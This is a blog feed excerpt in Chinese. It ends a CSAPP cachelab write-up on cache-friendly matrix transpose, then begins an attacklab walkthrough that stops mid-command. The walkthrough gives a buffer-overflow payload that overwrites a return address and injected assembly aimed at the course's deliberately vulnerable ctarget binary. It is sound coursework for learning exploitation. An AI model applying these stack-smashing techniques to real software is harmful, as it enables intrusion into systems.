class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                <span class="comment">// 局部变量按行存B的右上</span></span><br><span class="line">                a0 = B[j + k][i + <span class="number">4</span>];</span><br><span class="line">                a1 = B[j + k][i + <span class="number">5</span>];</span><br><span class="line">                a2 = B[j + k][i + <span class="number">6</span>];</span><br><span class="line">                a3 = B[j + k][i + <span class="number">7</span>];</span><br><span class="line">                <span class="comment">// 按列取出A的左下转置到B的右上空出的那一行</span></span><br><span class="line">                B[j + k][i + <span class="number">4</span>] = A[i + <span class="number">4</span>][j + k];</span><br><span class="line">                B[j + k][i + <span class="number">5</span>] = A[i + <span class="number">5</span>][j + k];</span><br><span class="line">                B[j + k][i + <span class="number">6</span>] = A[i + <span class="number">6</span>][j + k];</span><br><span class="line">                B[j + k][i + <span class="number">7</span>] = A[i + <span class="number">7</span>][j + k];</span><br><span class="line">                <span class="comment">// 把保存的那一行转移到B的左下</span></span><br><span class="line">                B[j + <span class="number">4</span> + k][i] = a0;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">1</span>] = a1;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">2</span>] = a2;</span><br><span class="line">                B[j + <span class="number">4</span> + k][i + <span class="number">3</span>] = a3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// B的右下等于A的右下的转置</span></span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">4</span>; k &lt; <span class="number">8</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">for</span>(t = <span class="number">4</span>; t &lt; <span class="number">8</span>; ++t)&#123;</span><br><span class="line">                    B[j + k][i + t] = A[i + t][j + k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line">&#125;<span class="comment">// trans_blocking_pp</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 2 (3 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 2 (plus plus version of blocking trans): hits:12073, misses:1244, evictions:1212</span><br></pre></td></tr></table></figure><p>仅仅1244 misses!!!小于满分的要求1300，虽然别人题解更低的也不少，但是由于我是受到把8 <em> 8分成4块4 </em> 4的启发后自己探索拿到的满分，还是很有成就感!!!</p><h3 id="3-61-times-67"><a href="#3-61-times-67" class="headerlink" title="(3) 61 $\times$ 67"></a>(3) 61 $\times$ 67</h3><p>实在想不到有什么特别的办法，那就在8 * 8的分块的基础上，把边角料给处理了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> trans_notsquare_decr[] = <span class="string">&quot;trans a matrix not square&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_notsquare</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i + <span class="number">8</span> &lt;= N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j + <span class="number">8</span> &lt;= M; j += <span class="number">8</span>)&#123;    </span><br><span class="line">            <span class="keyword">for</span>(k = i; k &lt; i + <span class="number">8</span>; ++k)&#123;</span><br><span class="line">                    a0 = A[k][j];</span><br><span class="line">                    a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                    a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                    B[j][k] = a0;</span><br><span class="line">                    B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">                    B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">                    B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line">                    B[j + <span class="number">4</span>][k] = a4;</span><br><span class="line">                    B[j + <span class="number">5</span>][k] = a5;</span><br><span class="line">                    B[j + <span class="number">6</span>][k] = a6;</span><br><span class="line">                    B[j + <span class="number">7</span>][k] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = N - N % <span class="number">8</span>; i &lt; N; ++i)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M - M % <span class="number">8</span>; ++j)</span><br><span class="line">            B[j][i] = A[i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N - N % <span class="number">8</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span>(j = M - M % <span class="number">8</span>; j &lt; M ; ++j)</span><br><span class="line">            B[j][i] = A[i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = N - N % <span class="number">8</span>; i &lt; N; ++i)</span><br><span class="line">        <span class="keyword">for</span>(j = M - M % <span class="number">8</span>; j &lt; M; ++j)</span><br><span class="line">            B[j][i] = A[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (trans a matrix not square): hits:6102, misses:2077, evictions:2045</span><br></pre></td></tr></table></figure><br>苦亚西，苦亚西————满分是2000以下，现在2077，那就在处理边角料那里再怼几个局部变量</p><p>来点循环展开：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = N - N % <span class="number">8</span>; i &lt; N; ++i)</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M - M % <span class="number">8</span>; ++j)</span><br><span class="line">        B[j][i] = A[i][j];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N - N % <span class="number">8</span>; ++i)&#123;</span><br><span class="line">    a0 = A[i][M - <span class="number">5</span>];</span><br><span class="line">    a1 = A[i][M - <span class="number">4</span>];</span><br><span class="line">    a2 = A[i][M - <span class="number">3</span>];</span><br><span class="line">    a3 = A[i][M - <span class="number">2</span>];</span><br><span class="line">    a4 = A[i][M - <span class="number">1</span>];</span><br><span class="line">    B[M - <span class="number">5</span>][i] = a0;</span><br><span class="line">    B[M - <span class="number">4</span>][i] = a1;</span><br><span class="line">    B[M - <span class="number">3</span>][i] = a2;</span><br><span class="line">    B[M - <span class="number">2</span>][i] = a3;</span><br><span class="line">    B[M - <span class="number">1</span>][i] = a4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = N - N % <span class="number">8</span>; i &lt; N; ++i)&#123;</span><br><span class="line">    a0 = A[i][M - <span class="number">5</span>];</span><br><span class="line">    a1 = A[i][M - <span class="number">4</span>];</span><br><span class="line">    a2 = A[i][M - <span class="number">3</span>];</span><br><span class="line">    a3 = A[i][M - <span class="number">2</span>];</span><br><span class="line">    a4 = A[i][M - <span class="number">1</span>];</span><br><span class="line">    B[M - <span class="number">5</span>][i] = a0;</span><br><span class="line">    B[M - <span class="number">4</span>][i] = a1;</span><br><span class="line">    B[M - <span class="number">3</span>][i] = a2;</span><br><span class="line">    B[M - <span class="number">2</span>][i] = a3;</span><br><span class="line">    B[M - <span class="number">1</span>][i] = a4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (trans a matrix not square): hits:6115, misses:2064, evictions:2032</span><br></pre></td></tr></table></figure><br>2064!!!距离目标又近了一点，但是也太少了吧!!!所以我决定，放弃8 * 8，来点玄学分块</p><p>试一下8 <em> 13（选13是因为想到5 </em> 13 = 65离67比较近，不过应该没关系<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_notsquare</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, t;</span><br><span class="line">    <span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j += <span class="number">13</span>)&#123; </span><br><span class="line">            <span class="keyword">if</span>(i + <span class="number">8</span> &lt;= N &amp;&amp; j + <span class="number">13</span> &lt;= M)&#123;</span><br><span class="line">                <span class="keyword">for</span> (t = j; t &lt; j + <span class="number">13</span>; ++t) &#123;</span><br><span class="line">                    a0 = A[i][t];</span><br><span class="line">                    a1 = A[i + <span class="number">1</span>][t];</span><br><span class="line">                    a2 = A[i + <span class="number">2</span>][t];</span><br><span class="line">                    a3 = A[i + <span class="number">3</span>][t];</span><br><span class="line">                    a4 = A[i + <span class="number">4</span>][t];</span><br><span class="line">                    a5 = A[i + <span class="number">5</span>][t];</span><br><span class="line">                    a6 = A[i + <span class="number">6</span>][t];</span><br><span class="line">                    a7 = A[i + <span class="number">7</span>][t];</span><br><span class="line">                    B[t][i + <span class="number">0</span>] = a0;</span><br><span class="line">                    B[t][i + <span class="number">1</span>] = a1;</span><br><span class="line">                    B[t][i + <span class="number">2</span>] = a2;</span><br><span class="line">                    B[t][i + <span class="number">3</span>] = a3;</span><br><span class="line">                    B[t][i + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[t][i + <span class="number">5</span>] = a5;</span><br><span class="line">                    B[t][i + <span class="number">6</span>] = a6;</span><br><span class="line">                    B[t][i + <span class="number">7</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; N &amp;&amp; k &lt; i + <span class="number">8</span>; ++k)</span><br><span class="line">                    <span class="keyword">for</span>(t = j; t &lt; M &amp;&amp; t &lt; j + <span class="number">13</span>; ++t)</span><br><span class="line">                        B[t][k] = A[k][t];</span><br><span class="line">            &#125;         </span><br><span class="line">        &#125;<span class="comment">// for j</span></span><br><span class="line">    &#125;<span class="comment">// for i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (trans a matrix not square): hits:6357, misses:1822, evictions:1790</span><br></pre></td></tr></table></figure><br>1822爽过</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CMU 15-213 CSAPP】详解attacklab——用代码注入和ROP攻击程序</title>
      <link href="/2024/02/13/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3attacklab%E2%80%94%E2%80%94%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8CROP%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/02/13/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3attacklab%E2%80%94%E2%80%94%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8CROP%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>磕磕绊绊终于把attacklab打完了，有了bomblab的基础打这个真是好玩极了</p><p>参考资料：</p><p>课程视频链接：<a href="https://www.bilibili.com/video/BV1iW411d7hd">2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频</a></p><p>实验文档：<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a></p><h1 id="零、-实验须知"><a href="#零、-实验须知" class="headerlink" title="零、 实验须知"></a>零、 实验须知</h1><h2 id="1-hex2raw"><a href="#1-hex2raw" class="headerlink" title="1. hex2raw"></a>1. hex2raw</h2><p>实验文件中有一个hex2raw，它接收一个文件，文件中是许多<strong>以空格分割的两位十六进制数</strong>，然后将每个数根据ASCII码转换为字符然后输出，使用方式如下：</p><p>已有test.txt如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38</span><br><span class="line">39 3a 3b 3c 3d 3e 3f 40 41</span><br></pre></td></tr></table></figure></p><p>调用hex2raw：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;test.txt &gt;test_raw.txt</span><br></pre></td></tr></table></figure></p><p>得到test_raw.txt如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789:;&lt;=&gt;?@A</span><br></pre></td></tr></table></figure></p><h2 id="2-code2byte"><a href="#2-code2byte" class="headerlink" title="2. code2byte"></a>2. code2byte</h2><p>hex2raw已经允许我们将十六进制数转化为字符，然后输入到程序中。现在我们想向程序中注入指令，就只需要得到指令对应的十六进制表示，然后丢到hex2raw中，最后输入到程序，如下：</p><p><strong>指令 -&gt; 十六进制表示 -&gt; 字符串</strong></p><p>实际上，利用gcc和objdump就能够完成上述步骤：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c test.s</span><br><span class="line">objdump -d test.o &gt; test.d</span><br></pre></td></tr></table></figure></p><p>示例如下：<br>已有test.s：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %rdi, %rax</span><br><span class="line">add $0x8, %rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><br>执行以下命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gcc -c test.s</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# objdump -d test.o &gt; test.d</span><br></pre></td></tr></table></figure><br>得到test.d：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 89 f8             mov    %rdi,%rax</span><br><span class="line">   3:48 83 c0 08          add    $0x8,%rax</span><br><span class="line">   7:c3                   ret    </span><br></pre></td></tr></table></figure><br>取每个指令的十六进制表示，保存到test.txt：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 89 f8 48 83 c0 08 c3</span><br></pre></td></tr></table></figure><br>然后利用hex2raw即可</p><h2 id="3-实验文件的参数"><a href="#3-实验文件的参数" class="headerlink" title="3. 实验文件的参数"></a>3. 实验文件的参数</h2><p>ctarget和rtarget都可<strong>用-q开启离线测评</strong>，<strong>用-i (fileName)指定输入文件</strong></p><p>不使用离线测评时，会出现Running on an illegal host的错误：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./ctarget</span><br><span class="line">FAILED: Initialization error: Running on an illegal host [Andrew]</span><br></pre></td></tr></table></figure></p><h1 id="一、代码注入-Code-Injection-Attacks"><a href="#一、代码注入-Code-Injection-Attacks" class="headerlink" title="一、代码注入(Code Injection Attacks)"></a>一、代码注入(Code Injection Attacks)</h1><h2 id="1-touch1"><a href="#1-touch1" class="headerlink" title="1. touch1"></a>1. touch1</h2><h3 id="1-1-解题思路"><a href="#1-1-解题思路" class="headerlink" title="1.1 解题思路"></a>1.1 解题思路</h3><p>第一个关卡要求我们通过缓冲区溢出，在getbuf返回的时候跳转到touch1</p><p>那么我们需要：</p><ol><li>getbuf缓冲区的大小</li><li>touch1的地址</li></ol><p>在gdb中使用<strong>disas getbuf</strong>查看getbuf的汇编：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gdb ctarget</span><br><span class="line">(gdb) disas getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><br>观察到缓冲区长度为0x28，换算成十进制就是40个字节，也就是说：<strong>输入超过40个字符的字符串就会造成缓冲区溢出</strong></p><p>在gdb中使用<strong>disas touch1</strong>查看touch1的汇编：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:    mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:    call   0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:    mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:    call   0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:    mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:    call   0x400e40 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><br>观察到<strong>touch1函数入口的地址为0x4017c0</strong></p><h3 id="1-2-解题过程"><a href="#1-2-解题过程" class="headerlink" title="1.2 解题过程"></a>1.2 解题过程</h3><p>我们希望getbuf在读取我们输入的字符串后，栈的结构是这样的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 40 17 c0 # 返回地址被覆盖为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 栈顶</span><br></pre></td></tr></table></figure></p><p>由于我们输入的字符是一个一个从栈顶往上边保存的，这就要求输入的字符串，用十六进制表示是上面前后颠倒的形式：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>前面40个字符可以是任意的</p><p>保存为touch1.txt，然后放到hex2raw转化为字符串输入到ctarget中，得到如下结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;touch1.txt &gt;t1raw.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./ctarget -q -i t1raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>看到<strong>Touch1!: You called touch1()</strong> 说明通过测试</p><h2 id="2-touch2"><a href="#2-touch2" class="headerlink" title="2. touch2"></a>2. touch2</h2><h3 id="2-1-解题思路"><a href="#2-1-解题思路" class="headerlink" title="2.1 解题思路"></a>2.1 解题思路</h3><p>从实验文档中可知，第二个关卡不仅要求我们跳转到touch2，而且需要将第一个参数设置为cookie的值。</p><p>也就是说，我们需要</p><ol><li>跳转到一段可以完成上述任务的代码，由我们在缓冲区中自行编写，所以需要<strong>获取栈顶的地址</strong></li><li>在代码中<strong>修改%rdi的值为cookie的值</strong></li><li>利用ret的机制（从栈顶弹出一个地址去跳转）跳转到touch2，所以需要<strong>获取touch2的地址压入栈中</strong></li></ol><p>利用gdb调试获取getbuf分配栈帧后栈顶的地址，作为注入代码的起始位置<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gdb ctarget</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -q -i t1raw.txt</span><br><span class="line">Starting program: /mnt/d/.c/csapp/target1/ctarget -q -i t1raw.txt</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12      buf.c: No such file or directory.</span><br><span class="line">(gdb) stepi</span><br><span class="line">14      in buf.c</span><br><span class="line">(gdb) p /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure><br>在getbuf打个断点，执行第一条指令，也就是分配栈帧，然后查看$rsp的值，得到<strong>栈顶地址为0x5561dx78</strong></p><p>查看<strong>cookie的值为0x59b997fa</strong></p><p>查看touch2的地址<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas touch2</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">   0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp</span><br></pre></td></tr></table></figure><br>得到<strong>touch2的地址为0x4017ec</strong></p><h3 id="2-2-解题过程"><a href="#2-2-解题过程" class="headerlink" title="2.2 解题过程"></a>2.2 解题过程</h3><p>首先应该编写注入代码touch2.s如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">subq $0x8, %rsp</span><br><span class="line">movq $0x4017ec, (%rsp)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><br>其实第二第三行能用一行push就搞定，等价于：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">push $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p><p>得到指令的十六进制表示<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gcc -c touch2.s</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# objdump -d 